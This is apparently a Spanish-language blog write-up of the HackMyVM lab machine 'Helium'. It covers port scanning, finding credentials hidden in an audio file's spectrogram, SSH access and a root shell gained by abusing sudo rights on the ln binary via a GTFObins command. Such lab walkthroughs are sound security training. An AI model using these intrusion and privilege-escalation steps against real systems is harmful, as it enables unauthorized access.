---
layout: single
title: Helium - HackMyVM
excerpt: "Helium es una máquina Linux creada por sML. En esta máquina encontraremos unas credenciales de acceso dentro de un archivo de audio, para analizar el audio usaremos audacity, audacity es un software de edición y grabación de sonido de código abierto. Elevaremos privilegios con el binario ln y usando el recurso online GTFObins."
date: 2021-11-13
classes: wide
header:
  teaser: /assets/images/hmvm-Helium/hmvmHelium.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - ln
  - stego
  - sML
---

### Escaneo de puertos
```bash
nmap -p- -T4 --open -v -n 192.168.1.61

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```bash
nmap -sCV -p 22,80 192.168.1.61

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:f6:55:5f:c6:fa:fb:14:15:ae:4a:2b:38:d8:4a:30 (RSA)
|   256 b7:ac:87:6d:c4:f9:e3:9a:d4:6e:e0:4f:da:aa:22:20 (ECDSA)
|_  256 fe:e8:05:af:23:4d:3a:82:2a:64:9b:f7:35:e4:44:4a (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: RELAX
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### WEB
Visito la web y en el código fuente me encuentro con un comentario y un posible usuario.

![](/assets/images/hmvm-Helium/cfont.png)

Hago click en bootstrap.min.css...

![](/assets/images/hmvm-Helium/etiquetaLink.png)

Me muestra una ruta con una archivo de audio.

![](/assets/images/hmvm-Helium/rutaAudio.png)

Descargo el audio usando curl.

`curl http://192.168.1.61/yay/mysecretsound.wav -o mysecretsound.wav`

Analizo el audio con audacity y en la opción `espectrograma` me muestra lo siguiente:

![](/assets/images/hmvm-Helium/audacity.png)

Consigo acceso al sistema con los datos encontrados en los pasos anteriores.
```bash
ssh paul@192.168.1.61
paul@192.168.1.61's password: 
Linux helium 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
paul@helium:~$
```

Leo la flag de user.

![](/assets/images/hmvm-Helium/userFlag.png)

Compruebo los comandos que puedo ejecutar con sudo.

![](/assets/images/hmvm-Helium/sudoL.png)

### GTFObins
Hago la busqueda del binario ln.

![](/assets/images/hmvm-Helium/ln.png)

Obtengo el root usando los comandos de gtfobins.
```bash
paul@helium:~$ sudo ln -fs /bin/sh /bin/ln
paul@helium:~$ sudo ln
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

Flag root.
```bash
# cat root.txt
ixxxxxxxxxxt
```
